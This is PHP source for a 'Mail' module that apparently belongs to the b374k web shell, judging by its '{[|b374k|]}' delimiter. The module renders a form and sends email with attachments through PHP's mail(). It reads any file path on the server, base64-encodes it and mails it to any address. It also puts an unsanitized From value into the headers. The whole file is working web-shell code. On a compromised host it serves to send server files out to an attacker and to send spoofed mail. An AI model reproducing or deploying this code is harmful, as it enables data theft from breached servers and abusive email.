<?php
$GLOBALS['module']['mail']['id'] = "mail";
$GLOBALS['module']['mail']['title'] = "Mail";
$GLOBALS['module']['mail']['js_ontabselected'] = "if(!portableMode) $('#mailFrom').focus();";
$GLOBALS['module']['mail']['content'] = "
<table class='boxtbl'>
<thead>
	<tr><th colspan='2'><p class='boxtitle'>Mail</p></th></tr>
</thead>
<tbody id='mailTBody'>
	<tr><td style='width:120px'>From</td><td colspan='2'><input type='text' id='mailFrom' value='' onkeydown=\"trap_enter(event, 'mail_send');\"></td></tr>
	<tr><td>To</td><td><input type='text' id='mailTo' value='' onkeydown=\"trap_enter(event, 'mail_send');\"></td></tr>
	<tr><td>Subject</td><td><input type='text' id='mailSubject' value='' onkeydown=\"trap_enter(event, 'mail_send');\"></td></tr>
</tbody>
<tfoot>
	<tr><td colspan='2'><textarea id='mailContent' style='height:140px;min-height:140px;'></textarea></td></tr>
	<tr>
		<td colspan='2'><span style='width:120px;' class='button' onclick=\"mail_send();\">send</span>
		<span style='width:120px;' class='button' onclick=\"mail_attach();\">attachment</span>
		</td>
	</tr>
	<tr><td colspan='2'><span id='mailResult'></span></td></tr>
</tfoot>
</table>
";

if(!function_exists('send_email')){
	function send_email($from, $to, $subject, $msg, $attachment){
		$headers = "MIME-Version: 1.0\r\n".$from;

		$rand = md5(time());
		$headers .= "Content-Type: multipart/mixed; boundary=\"".$rand."\"\r\n\r\n";

		$headers .= "--".$rand."\r\n";
		$headers .= "Content-Type: text/html; charset=\"UTF-8\"\r\nContent-Transfer-Encoding: 8bit\r\n\r\n";
		$headers .= $msg."\r\n\r\n";

		if(count($attachment)>0){
			foreach($attachment as $file){
				if(is_file($file)){
					$content = chunk_split(base64_encode(read_file($file)));
					$headers .= "--".$rand."\r\n";
					$headers .= "Content-Type: application/octet-stream; name=\"".basename($file)."\"\r\n";
					$headers .= "Content-Transfer-Encoding: base64\r\n";
					$headers .= "Content-Disposition: attachment\r\n\r\n";
					$headers .= $content."\r\n\r\n";
				}
			}
		}
		$headers .= "--".$rand."--\r\n";
		if(@mail($to, $subject, "", $headers)) return true;
		return false;
	}
}

if(isset($p['mailFrom'])&&isset($p['mailTo'])&&isset($p['mailSubject'])&&isset($p['mailContent'])){
	$mailFrom = trim($p['mailFrom']);
	$mailTo = trim($p['mailTo']);
	$mailSubject = trim($p['mailSubject']);
	$mailContent = trim($p['mailContent']);
	$mailAttachment = trim($p['mailAttachment']);
	$mailAttachment = (!empty($mailAttachment))? explode("{[|b374k|]}", $p['mailAttachment']):array();

	if(empty($mailTo)) output("Please specify at least one recipient");
	if(!empty($mailFrom)){
		$mailFrom = "From: ".$mailFrom."\r\nReply-To: ".$mailFrom."\r\n";
	}

	foreach($mailAttachment as $file){
		$file = trim($file);
		if(empty($file)) continue;
		if(!is_file($file)) output("No such file : ".$file);
	}

	if(send_email($mailFrom, $mailTo, $mailSubject, $mailContent, $mailAttachment)) output("Mail sent to ".html_safe($mailTo));
	output("Failed to send mail");
}

?>